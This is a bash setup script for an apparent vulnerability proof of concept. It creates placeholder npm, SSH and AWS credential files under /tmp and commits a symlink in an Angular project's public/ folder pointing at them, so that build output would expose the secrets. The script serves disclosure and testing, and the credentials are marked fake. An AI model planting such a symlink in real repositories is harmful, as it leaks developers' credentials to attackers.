#!/usr/bin/env bash
# Creates the PLACEHOLDER "victim home" and the committed symlink.
# Everything here is fake and lives under /tmp — nothing real is touched.
set -euo pipefail

VICTIM="/tmp/ng-poc-victim-home"

echo "==> Creating placeholder victim home at $VICTIM"
mkdir -p "$VICTIM/.ssh" "$VICTIM/.aws"
cat > "$VICTIM/.npmrc" <<'F'
//registry.npmjs.org/:_authToken=npm_PLACEHOLDER_TOKEN_NOT_REAL
F
cat > "$VICTIM/.ssh/id_rsa" <<'F'
-----BEGIN OPENSSH PRIVATE KEY-----
PLACEHOLDER_PRIVATE_KEY_MATERIAL_NOT_REAL
-----END OPENSSH PRIVATE KEY-----
F
cat > "$VICTIM/.aws/credentials" <<'F'
[default]
aws_access_key_id = AKIAPLACEHOLDERNOTREAL
aws_secret_access_key = PLACEHOLDER_SECRET_NOT_REAL
F

echo "==> Creating the attacker payload: ONE symlink inside public/"
rm -f public/docs
ln -s "$VICTIM" public/docs

echo "==> This is what the attacker commits (a mode-120000 git object):"
git add -A >/dev/null 2>&1 || true
git ls-files -s public/docs 2>/dev/null || echo "   (run 'git init && git add -A' to see the mode)"

echo
echo "Setup complete. angular.json was NOT modified. Now run: ./verify-poc.sh"
